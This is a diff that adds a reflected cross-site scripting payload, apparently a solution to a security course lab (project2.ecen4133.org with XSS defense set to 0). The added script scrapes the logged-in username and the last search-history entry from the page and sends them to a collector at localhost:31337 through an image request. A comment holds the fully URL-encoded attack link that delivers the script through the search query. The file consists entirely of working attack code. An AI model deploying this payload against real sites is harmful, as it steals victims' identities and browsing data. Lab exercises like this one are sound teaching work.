@@ -1,0 +1,14 @@
+<script>
+    setTimeout(function() {
+    let user = document.querySelector("#logged-in-user") ? document.querySelector("#logged-in-user").innerText : 'not_found';
+
+    let historyItems = document.querySelectorAll(".history-item.list-group-item");
+    let last_search = (historyItems.length > 1) ? historyItems[1].innerText : "not_found";
+
+    (new Image()).src = "http://localhost:31337/?retrieved_user=" + encodeURIComponent(user) + "&last_search=" + encodeURIComponent(last_search);
+    }, 100);
+</script>
+
+<!--
+https://project2.ecen4133.org/search?xssdefense=0&q=%3Cscript%3E%0D%0A%20%20%20%20setTimeout%28function%28%29%20%7B%0D%0A%20%20%20%20let%20user%20%3D%20document.querySelector%28%22%23logged-in-user%22%29%20%3F%20document.querySelector%28%22%23logged-in-user%22%29.innerText%20%3A%20%27not_found%27%3B%0D%0A%0D%0A%20%20%20%20let%20historyItems%20%3D%20document.querySelectorAll%28%22.history-item.list-group-item%22%29%3B%0D%0A%20%20%20%20let%20last_search%20%3D%20%28historyItems.length%20%3E%201%29%20%3F%20historyItems%5B1%5D.innerText%20%3A%20%22not_found%22%3B%0D%0A%0D%0A%20%20%20%20%28new%20Image%28%29%29.src%20%3D%20%22http%3A%2F%2Flocalhost%3A31337%2F%3Fretrieved_user%3D%22%20%2B%20encodeURIComponent%28user%29%20%2B%20%22%26last_search%3D%22%20%2B%20encodeURIComponent%28last_search%29%3B%0D%0A%20%20%20%20%7D%2C%20100%29%3B%0D%0A%3C%2Fscript%3E
+-->
